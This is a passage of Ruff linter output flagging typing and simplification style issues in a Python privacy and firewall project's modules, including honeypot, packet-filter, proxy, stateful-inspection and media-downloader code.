help: Replace with `dict.fromkeys(iterable)`)

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:350:60
    |
348 |         }
349 |
350 |     def get_decoy_recommendations(self, source_ip: str) -> List[str]:
    |                                                            ^^^^
351 |         """
352 |         Get list of decoys to show attacker
    |
help: Replace with `list`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\honeypot_swarm.py:376:19
    |
374 |         # Prioritize decoys they haven't seen (keep them guessing)
375 |         unseen_decoys = [
376 |             d for d in self.decoys.keys() if d not in attacker.accessed_decoys
    |                   ^^^^^^^^^^^^^^^^^^^^^^^
377 |         ]
    |
help: Remove `.keys()`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\manager.py:4:1
  |
3 | import logging
4 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | from .circuit_level import CircuitLevelGateway
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\manager.py:22:32
   |
20 |     """
21 |
22 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
23 |         self.config = config
24 |         self.logger = logging.getLogger(__name__)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\manager.py:72:38
   |
70 |         self._active = False
71 |
72 |     def process_packet(self, packet: Dict[str, Any]) -> bool:
   |                                      ^^^^
73 |         """
74 |         Process packet through all enabled firewalls.
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\manager.py:96:50
   |
94 |         return True
95 |
96 |     def add_rule(self, firewall_type: str, rule: Dict[str, Any]):
   |                                                  ^^^^
97 |         """Add rule to specific firewall"""
98 |         if firewall_type in self.firewalls:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\manager.py:108:33
    |
106 |             self.firewalls[firewall_type].remove_rule(rule_id)
107 |
108 |     def get_statistics(self) -> Dict[str, Dict[str, int]]:
    |                                 ^^^^
109 |         """Get statistics from all firewalls"""
110 |         stats = {}
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\manager.py:108:43
    |
106 |             self.firewalls[firewall_type].remove_rule(rule_id)
107 |
108 |     def get_statistics(self) -> Dict[str, Dict[str, int]]:
    |                                           ^^^^
109 |         """Get statistics from all firewalls"""
110 |         stats = {}
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\next_generation.py:4:1
  |
3 | import hashlib
4 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | from .base import FirewallBase
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\next_generation.py:15:32
   |
13 |     """
14 |
15 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
16 |         super().__init__(config)
17 |         self.ai_detection = config.get("ai_detection", True)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\next_generation.py:32:30
   |
30 |         self._active = False
31 |
32 |     def add_rule(self, rule: Dict[str, Any]):
   |                              ^^^^
33 |         """Add NGFW rule"""
34 |         self._rules.append(rule)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\next_generation.py:46:38
   |
44 |         self._threat_signatures.add("baadf00d")
45 |
46 |     def process_packet(self, packet: Dict[str, Any]) -> bool:
   |                                      ^^^^
47 |         """Process packet with advanced inspection"""
48 |         if not self._active:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\next_generation.py:69:47
   |
67 |         return True
68 |
69 |     def _deep_packet_inspection(self, packet: Dict[str, Any]) -> bool:
   |                                               ^^^^
70 |         """Perform deep packet inspection"""
71 |         payload = packet.get("payload", "")
   |
help: Replace with `dict`

SIM103 Return the negated condition directly
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\next_generation.py:82:9
   |
80 |           # Check for protocol violations
81 |           protocol = packet.get("protocol", "")
82 | /         if protocol == "http" and "Host" not in str(payload):
83 | |             return False
84 | |
85 | |         return True
   | |___________________^
86 |
87 |       def _detect_anomaly(self, packet: Dict[str, Any]) -> bool:
   |
help: Inline condition

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\next_generation.py:87:39
   |
85 |         return True
86 |
87 |     def _detect_anomaly(self, packet: Dict[str, Any]) -> bool:
   |                                       ^^^^
88 |         """AI-based anomaly detection"""
89 |         # Simplified anomaly detection
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\next_generation.py:110:45
    |
108 |         return False
109 |
110 |     def _is_intrusion_attempt(self, packet: Dict[str, Any]) -> bool:
    |                                             ^^^^
111 |         """Detect intrusion attempts"""
112 |         payload = str(packet.get("payload", ""))
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\next_generation.py:134:42
    |
132 |         self._threat_signatures.add(signature)
133 |
134 |     def get_threat_intelligence(self) -> Dict[str, Any]:
    |                                          ^^^^
135 |         """Get threat intelligence data"""
136 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\packet_filtering.py:3:1
  |
1 | """Packet-Filtering Firewall implementation"""
2 |
3 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4 |
5 | from .base import FirewallBase
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\packet_filtering.py:14:32
   |
12 |     """
13 |
14 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
15 |         super().__init__(config)
16 |         self.default_policy = config.get("default_policy", "deny")
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\packet_filtering.py:46:30
   |
44 |         )
45 |
46 |     def add_rule(self, rule: Dict[str, Any]):
   |                              ^^^^
47 |         """Add packet filtering rule"""
48 |         if "id" not in rule:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\packet_filtering.py:60:38
   |
58 |         self._packet_rules = [r for r in self._packet_rules if r.get("id") != rule_id]
59 |
60 |     def process_packet(self, packet: Dict[str, Any]) -> bool:
   |                                      ^^^^
61 |         """
62 |         Process packet through filtering rules.
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\packet_filtering.py:89:35
   |
87 |         return allowed
88 |
89 |     def _match_rule(self, packet: Dict[str, Any], rule: Dict[str, Any]) -> bool:
   |                                   ^^^^
90 |         """Check if packet matches rule criteria"""
91 |         # Match protocol
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\packet_filtering.py:89:57
   |
87 |         return allowed
88 |
89 |     def _match_rule(self, packet: Dict[str, Any], rule: Dict[str, Any]) -> bool:
   |                                                         ^^^^
90 |         """Check if packet matches rule criteria"""
91 |         # Match protocol
   |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\packet_filtering.py:96:9
   |
95 |           # Match source IP
96 | /         if "src_ip" in rule:
97 | |             if not self._match_ip(packet.get("src_ip"), rule["src_ip"]):
   | |________________________________________________________________________^
98 |                   return False
   |
help: Combine `if` statements using `and`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\packet_filtering.py:101:9
    |
100 |           # Match destination IP
101 | /         if "dst_ip" in rule:
102 | |             if not self._match_ip(packet.get("dst_ip"), rule["dst_ip"]):
    | |________________________________________________________________________^
103 |                   return False
    |
help: Combine `if` statements using `and`

SIM103 Return the negated condition directly
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\packet_filtering.py:114:9
    |
113 |           # Match state
114 | /         if "state" in rule and packet.get("state") != rule["state"]:
115 | |             return False
116 | |
117 | |         return True
    | |___________________^
118 |
119 |       def _match_ip(self, ip: str, rule_ips) -> bool:
    |
help: Inline condition

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\proxy.py:3:1
  |
1 | """Proxy Firewall implementation"""
2 |
3 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4 |
5 | from .base import FirewallBase
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\proxy.py:14:32
   |
12 |     """
13 |
14 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
15 |         super().__init__(config)
16 |         self.cache_enabled = config.get("cache_enabled", False)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\proxy.py:32:30
   |
30 |         self._proxy_connections.clear()
31 |
32 |     def add_rule(self, rule: Dict[str, Any]):
   |                              ^^^^
33 |         """Add proxy rule"""
34 |         self._rules.append(rule)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\proxy.py:40:38
   |
38 |         self._rules = [r for r in self._rules if r.get("id") != rule_id]
39 |
40 |     def process_packet(self, packet: Dict[str, Any]) -> bool:
   |                                      ^^^^
41 |         """Process packet through proxy"""
42 |         if not self._active:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\proxy.py:61:40
   |
59 |         return True
60 |
61 |     def _inspect_payload(self, packet: Dict[str, Any]) -> bool:
   |                                        ^^^^
62 |         """Inspect packet payload for threats"""
63 |         payload = packet.get("payload", "")
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\proxy.py:82:41
   |
80 |         return True
81 |
82 |     def _match_proxy_rule(self, packet: Dict[str, Any], rule: Dict[str, Any]) -> bool:
   |                                         ^^^^
83 |         """Match packet against proxy rule"""
84 |         # Match based on application layer criteria
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\proxy.py:82:63
   |
80 |         return True
81 |
82 |     def _match_proxy_rule(self, packet: Dict[str, Any], rule: Dict[str, Any]) -> bool:
   |                                                               ^^^^
83 |         """Match packet against proxy rule"""
84 |         # Match based on application layer criteria
   |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\proxy.py:90:9
   |
88 |                   return True
89 |
90 | /         if "content_type" in rule:
91 | |             if packet.get("content_type") == rule["content_type"]:
   | |__________________________________________________________________^
92 |                   return True
   |
help: Combine `if` statements using `and`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\software.py:3:1
  |
1 | """Software Firewall implementation"""
2 |
3 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
4 |
5 | from .base import FirewallBase
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\software.py:14:32
   |
12 |     """
13 |
14 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
15 |         super().__init__(config)
16 |         self.user_space = config.get("user_space", True)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\software.py:30:30
   |
28 |         self._active = False
29 |
30 |     def add_rule(self, rule: Dict[str, Any]):
   |                              ^^^^
31 |         """Add software firewall rule"""
32 |         self._rules.append(rule)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\software.py:47:38
   |
45 |         self.add_rule({"id": "allow_system", "process": "system", "action": "allow"})
46 |
47 |     def process_packet(self, packet: Dict[str, Any]) -> bool:
   |                                      ^^^^
48 |         """Process packet through software firewall"""
49 |         if not self._active:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\software.py:68:48
   |
66 |         return True
67 |
68 |     def _check_application_rules(self, packet: Dict[str, Any]) -> bool:
   |                                                ^^^^
69 |         """Check application-level rules"""
70 |         app = packet.get("application", "")
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\stateful_inspection.py:4:1
  |
3 | import time
4 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
5 |
6 | from .base import FirewallBase
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\stateful_inspection.py:15:32
   |
13 |     """
14 |
15 |     def __init__(self, config: Dict[str, Any]):
   |                                ^^^^
16 |         super().__init__(config)
17 |         self.connection_timeout = config.get("connection_timeout", 3600)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\stateful_inspection.py:31:30
   |
29 |         self._connection_table.clear()
30 |
31 |     def add_rule(self, rule: Dict[str, Any]):
   |                              ^^^^
32 |         """Add stateful rule"""
33 |         self._rules.append(rule)
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\stateful_inspection.py:39:38
   |
37 |         self._rules = [r for r in self._rules if r.get("id") != rule_id]
38 |
39 |     def process_packet(self, packet: Dict[str, Any]) -> bool:
   |                                      ^^^^
40 |         """Process packet with stateful inspection"""
41 |         if not self._active:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\stateful_inspection.py:82:42
   |
80 |         return False
81 |
82 |     def _get_connection_id(self, packet: Dict[str, Any]) -> str:
   |                                          ^^^^
83 |         """Generate connection identifier"""
84 |         return f"{packet.get('src_ip')}:{packet.get('src_port')}-{packet.get('dst_ip')}:{packet.get('dst_port')}"
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\stateful_inspection.py:87:23
   |
86 |     def _validate_connection_state(
87 |         self, packet: Dict[str, Any], connection: Dict[str, Any]
   |                       ^^^^
88 |     ) -> bool:
89 |         """Validate packet matches connection state"""
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\stateful_inspection.py:87:51
   |
86 |     def _validate_connection_state(
87 |         self, packet: Dict[str, Any], connection: Dict[str, Any]
   |                                                   ^^^^
88 |     ) -> bool:
89 |         """Validate packet matches connection state"""
   |
help: Replace with `dict`

SIM103 Return the condition `packet.get("protocol") == connection["protocol"]` directly
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\stateful_inspection.py:97:9
    |
 96 |           # Verify protocol matches
 97 | /         if packet.get("protocol") != connection["protocol"]:
 98 | |             return False
 99 | |
100 | |         return True
    | |___________________^
101 |
102 |       def _cleanup_expired_connections(self, current_time: float):
    |
help: Replace with `return packet.get("protocol") == connection["protocol"]`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\firewalls\stateful_inspection.py:113:39
    |
111 |             del self._connection_table[conn_id]
112 |
113 |     def get_connection_table(self) -> Dict[str, Any]:
    |                                       ^^^^
114 |         """Get active connection table"""
115 |         return self._connection_table.copy()
    |
help: Replace with `dict`

UP035 [*] Import from `collections.abc` instead: `Callable`
 --> external\Thirstys-Waterfall\thirstys_waterfall\kill_switch.py:5:1
  |
3 | import logging
4 | import threading
5 | from typing import Callable, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |
help: Import from `collections.abc`

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\kill_switch.py:5:1
  |
3 | import logging
4 | import threading
5 | from typing import Callable, List
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\kill_switch.py:18:26
   |
16 |         self._active = False
17 |         self._triggered = False
18 |         self._callbacks: List[Callable] = []
   |                          ^^^^
19 |         self._lock = threading.Lock()
   |
help: Replace with `list`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\format_converter.py:6:1
  |
5 | import logging
6 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\format_converter.py:21:63
   |
19 |         }
20 |
21 |     def convert(self, input_file: str, output_format: str) -> Dict[str, Any]:
   |                                                               ^^^^
22 |         """
23 |         Convert media file to different format.
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:9:1
   |
 7 | import logging
 8 | import os
 9 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
10 |
11 | from cryptography.fernet import Fernet
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:9:1
   |
 7 | import logging
 8 | import os
 9 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
10 |
11 | from cryptography.fernet import Fernet
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:28:32
   |
26 |     """
27 |
28 |     def __init__(self, config: Dict[str, Any], god_tier_encryption):
   |                                ^^^^
29 |         self.config = config
30 |         self.logger = logging.getLogger(__name__)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:49:31
   |
48 |         # Download queue (encrypted)
49 |         self._download_queue: List[Dict[str, Any]] = []
   |                               ^^^^
50 |
51 |         # Download history (encrypted, ephemeral)
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:49:36
   |
48 |         # Download queue (encrypted)
49 |         self._download_queue: List[Dict[str, Any]] = []
   |                                    ^^^^
50 |
51 |         # Download history (encrypted, ephemeral)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:52:33
   |
51 |         # Download history (encrypted, ephemeral)
52 |         self._download_history: List[Dict[str, Any]] = []
   |                                 ^^^^
53 |
54 |         self._active = False
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:52:38
   |
51 |         # Download history (encrypted, ephemeral)
52 |         self._download_history: List[Dict[str, Any]] = []
   |                                      ^^^^
53 |
54 |         self._active = False
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:83:19
   |
81 |         audio_format: str = "mp3",
82 |         video_format: str = "mp4",
83 |         metadata: Optional[Dict[str, Any]] = None,
   |                   ^^^^^^^^^^^^^^^^^^^^^^^^
84 |     ) -> Dict[str, Any]:
85 |         """
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:83:28
   |
81 |         audio_format: str = "mp3",
82 |         video_format: str = "mp4",
83 |         metadata: Optional[Dict[str, Any]] = None,
   |                            ^^^^
84 |     ) -> Dict[str, Any]:
85 |         """
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:84:10
   |
82 |         video_format: str = "mp4",
83 |         metadata: Optional[Dict[str, Any]] = None,
84 |     ) -> Dict[str, Any]:
   |          ^^^^
85 |         """
86 |         Download media with God tier encryption.
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:142:43
    |
140 |         return result
141 |
142 |     def _process_download(self, download: Dict[str, Any]) -> Dict[str, Any]:
    |                                           ^^^^
143 |         """
144 |         Process download with appropriate mode.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:142:62
    |
140 |         return result
141 |
142 |     def _process_download(self, download: Dict[str, Any]) -> Dict[str, Any]:
    |                                                              ^^^^
143 |         """
144 |         Process download with appropriate mode.
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:171:46
    |
169 |         return result
170 |
171 |     def _download_audio_only(self, download: Dict[str, Any]) -> Dict[str, Any]:
    |                                              ^^^^
172 |         """Download audio only"""
173 |         audio_format = download["audio_format"]
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:171:65
    |
169 |         return result
170 |
171 |     def _download_audio_only(self, download: Dict[str, Any]) -> Dict[str, Any]:
    |                                                                 ^^^^
172 |         """Download audio only"""
173 |         audio_format = download["audio_format"]
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:189:46
    |
187 |         }
188 |
189 |     def _download_video_only(self, download: Dict[str, Any]) -> Dict[str, Any]:
    |                                              ^^^^
190 |         """Download video only (no audio)"""
191 |         video_format = download["video_format"]
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:189:65
    |
187 |         }
188 |
189 |     def _download_video_only(self, download: Dict[str, Any]) -> Dict[str, Any]:
    |                                                                 ^^^^
190 |         """Download video only (no audio)"""
191 |         video_format = download["video_format"]
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:205:47
    |
203 |         }
204 |
205 |     def _download_audio_video(self, download: Dict[str, Any]) -> Dict[str, Any]:
    |                                               ^^^^
206 |         """Download both audio and video"""
207 |         audio_format = download["audio_format"]
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:205:66
    |
203 |         }
204 |
205 |     def _download_audio_video(self, download: Dict[str, Any]) -> Dict[str, Any]:
    |                                                                  ^^^^
206 |         """Download both audio and video"""
207 |         audio_format = download["audio_format"]
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:228:48
    |
226 |         }
227 |
228 |     def _download_best_quality(self, download: Dict[str, Any]) -> Dict[str, Any]:
    |                                                ^^^^
229 |         """Download best available quality"""
230 |         filename = f"media_{download['url_hash']}.{download['video_format']}"
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:228:67
    |
226 |         }
227 |
228 |     def _download_best_quality(self, download: Dict[str, Any]) -> Dict[str, Any]:
    |                                                                   ^^^^
229 |         """Download best available quality"""
230 |         filename = f"media_{download['url_hash']}.{download['video_format']}"
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:242:43
    |
240 |         }
241 |
242 |     def _encrypt_metadata(self, metadata: Dict[str, Any]) -> bytes:
    |                                           ^^^^
243 |         """Encrypt metadata with God tier encryption"""
244 |         import json
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:249:28
    |
247 |         return self.god_tier_encryption.encrypt_god_tier(metadata_str.encode())
248 |
249 |     def get_queue(self) -> List[Dict[str, Any]]:
    |                            ^^^^
250 |         """Get download queue (URLs encrypted)"""
251 |         return self._download_queue.copy()
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:249:33
    |
247 |         return self.god_tier_encryption.encrypt_god_tier(metadata_str.encode())
248 |
249 |     def get_queue(self) -> List[Dict[str, Any]]:
    |                                 ^^^^
250 |         """Get download queue (URLs encrypted)"""
251 |         return self._download_queue.copy()
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:253:30
    |
251 |         return self._download_queue.copy()
252 |
253 |     def get_history(self) -> List[Dict[str, Any]]:
    |                              ^^^^
254 |         """Get download history (encrypted)"""
255 |         return self._download_history.copy()
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:253:35
    |
251 |         return self._download_queue.copy()
252 |
253 |     def get_history(self) -> List[Dict[str, Any]]:
    |                                   ^^^^
254 |         """Get download history (encrypted)"""
255 |         return self._download_history.copy()
    |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_engine.py:262:29
    |
260 |         self.logger.info("Download history cleared")
261 |
262 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
263 |         """Get downloader status"""
264 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_library.py:7:1
  |
5 | import logging
6 | import time
7 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_library.py:7:1
  |
5 | import logging
6 | import time
7 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `list` instead of `List` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_library.py:27:24
   |
26 |         # Encrypted catalog
27 |         self._catalog: List[Dict[str, Any]] = []
   |                        ^^^^
28 |
29 |         # Library stats
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_library.py:27:29
   |
26 |         # Encrypted catalog
27 |         self._catalog: List[Dict[str, Any]] = []
   |                             ^^^^
28 |
29 |         # Library stats
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_library.py:35:19
   |
33 |         self,
34 |         file_path: str,
35 |         metadata: Optional[Dict[str, Any]] = None,
   |                   ^^^^^^^^^^^^^^^^^^^^^^^^
36 |         media_type: str = "video",
37 |     ) -> str:
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_library.py:35:28
   |
33 |         self,
34 |         file_path: str,
35 |         metadata: Optional[Dict[str, Any]] = None,
   |                            ^^^^
36 |         media_type: str = "video",
37 |     ) -> str:
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> external\Thirstys-Waterfall\thirstys_waterfall\media_downloader\media_library.py:85:41
   |
83 |         return item["id"]
84 |
